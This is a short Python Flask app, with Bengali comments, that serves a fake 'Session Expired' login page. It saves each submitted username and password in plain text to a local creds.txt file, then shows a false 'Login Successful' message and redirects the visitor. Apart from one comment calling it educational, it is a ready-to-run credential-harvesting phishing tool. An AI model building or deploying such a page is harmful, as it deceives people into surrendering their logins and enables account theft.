import os
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# HTML টেমপ্লেট (সিম্পল লগইন পেজ)
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
    <style>
        body {
            background: #0a0f1e;
            font-family: 'Segoe UI', system-ui;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e1e2f;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            text-align: center;
            width: 300px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 10px;
            border: none;
        }
        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 10px;
            cursor: pointer;
        }
        button:hover { background: #1e40af; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Session Expired</h2>
        <p>Please login again to continue</p>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # লগ সংরক্ষণ (শুধু শিক্ষামূলক কাজে)
    with open('creds.txt', 'a') as f:
        f.write(f"User: {username} | Pass: {password}\n")
    
    # সফল লগইন মেসেজ দেখিয়ে আবার হোমে রিডাইরেক্ট
    return "<h2>Login Successful! Redirecting...</h2><script>setTimeout(()=>{window.location.href='/'},2000);</script>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
